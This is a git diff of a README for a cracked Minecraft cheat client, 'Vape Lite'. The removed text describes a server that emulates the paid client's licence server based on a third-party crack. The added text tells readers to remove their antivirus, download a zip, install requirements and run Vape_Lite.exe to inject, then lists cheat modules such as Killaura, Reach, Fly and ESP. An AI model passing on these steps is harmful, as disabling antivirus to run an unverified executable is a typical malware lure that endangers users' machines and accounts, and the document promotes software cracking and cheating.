@@ -1,38 +1,122 @@
-# Vape Lite
+# Vape_Lite
+Ghost Client Minecraft
 
-> I do not promote any kind of cheating. This is just for teaching purposes, If u are gonna use this. Im WARNING you, it is not my fault if u get banned.
+![image](https://github.com/ByteSleuths/Vape-V4/assets/150552235/2aafe383-e694-465d-b6dc-0517818dc2c4)
 
-Firstly, huge credits to the Kangaroo's team for cracking vape. I have just made new working server
 
-# Vape Server
+# Tutorial on how to use it and Please read it:
 
-This is a new updated server that emulates Vape's server based on Kangaroo's crack since the old one wasn't working anymore.
+1.Remove Your antivirus 
 
-### What works?
-- Vape Lite Forge (1.7, 1.8, 1.12)
-- Every module
-- Saving config
-- Editing Profiles
-### What doesn't work?
-- Lunar client
-> If u would like to make it look like u are on Lunar Client, I recommend u getting Lilith. Lilith has Lunar spoofer, so while u are on forge it will show u that u are on Lunar Client. `discord.gg/lilith`
-- Vanilla 
-> Mapping issue (I'm lazy to fix, since it works on forge)
-### How to run it?
+2.install the crack : [Download](https://github.com/ByteSleuths/Vape-V4/archive/refs/heads/main.zip) 
 
-#### Server-side
-- Get Python3
-- Clone this git
-- Run `pip install -r requirements.txt` to install the requirements
-- Run `server.py`
-- Open Vape folder
-- Drag Vape file over the Kangaroo Patcher
-- Click Yes
-- Enjoy!
+3.Open a Cmd in the folder and put the command : pip install -r requirements.txt
 
-### Is this safe?
+4.Proceed to install [Java 17.0.6](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html) or a more recent version.
 
-I'm not entirely sure, I just took Kangaroo's crack. People told it's safe, I cannot confirm anything. Few of my friends have been using it for few weeks, nothing happened so it should be safe.
+5.Launch Lunar client or 1.8.9 vanilla
 
-### Credit
-- The Kangaroo Team for the crack and their old server
+6.Click on Vape_Lite.exe and wait till it inject
+
+# Features 🛠️
+### Vape-V4 can do plenty of things, like:
+
+
+### Combat
+- AimAssist
+- AutoClicker
+- Reach
+- SilentAura
+- HitSelect
+- Velocity
+- Sprint
+- WTap
+
+
+### Render
+- Search
+- NameTags
+- Tracers
+- StorageESP
+- ESP
+- AntiDebuff
+- Arrows
+- Chams
+- Fullbright
+- ItemESP
+- Projectiles
+- PropHunt
+- SpawnerFinder
+- Trajectories
+
+
+### Utility
+- Scaffold
+- ChestSteal
+- ArmorSwitch
+- AutoArmor
+- AutoHeal
+- AutoPearl
+- InvCleaner
+- Panic
+- ThrowDebuff
+- FakeLag
+- Blink
+- Throwpot
+- Refill
+
+
+### World
+- AutoTool
+- ChestSteal
+- FastPlace
+- FreeCam
+- MLG
+
+
+### Other features
+- Internal GUI
+- External GUI
+- Profiles
+- Friends
+- Macros
+- Text GUI
+- Duel Info
+- Target Info
+- Radar
+- Rearview
+
+
+### Legit Mods
+- Freelook
+- NoClickDelay
+- KeyStrokes
+- Clock
+- Potion Status
+- Armor Status
+- Compass
+- Time Changer
+- Coords
+- FPS
+- Reach Display
+- Time Changer
+- Inventory Blur
+- Clear Water
+- Block Overlay
+- Hit Color
+
+
+### Blatant  
+- Killaura
+- SafeWalk
+- Fly
+- HitBoxes
+- InvWalk
+- KeepSprint
+- NoFall
+- Timer
+
+
+
+
+
